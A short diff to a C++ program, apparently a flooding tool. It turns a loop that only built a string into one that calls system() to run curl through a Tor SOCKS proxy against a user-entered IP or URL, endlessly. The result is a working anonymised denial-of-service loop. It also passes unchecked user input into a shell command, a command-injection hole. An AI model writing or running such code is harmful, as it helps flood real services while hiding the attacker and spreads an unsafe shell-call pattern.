@@ -3,9 +3,9 @@
 #include <sstream>
 #include "resources/curly.hpp"
 #include "resources/termcolor.hpp"
+#include <stdlib.h>
 
 using namespace std;
-ostringstream ss;
 void icmpf()
 {
    cout << termcolor::red;
@@ -17,14 +17,14 @@ void icmpf()
      cout << "Enter a ip adress: ";
      cin >> ip;
      while (true) {
-        ss << "curl --socks5-hostname 127.0.0.1:9050 https://" << ip;
+        system(("curl --socks5-hostname 127.0.0.1:9050 https://" + ip).c_str());
      }
    } else if (urlorip == "--url") {
         string url;
-        cout << "Enter a ip adress: ";
+        cout << "Enter a URL adress: ";
         cin >> url;
         while (true) {
-            ss << "curl --socks5-hostname 127.0.0.1:9050 https://" << url;
+            system(("curl --socks5-hostname 127.0.0.1:9050 https://" + url).c_str());
      }
     } else {
         cout << "EROR" << endl;
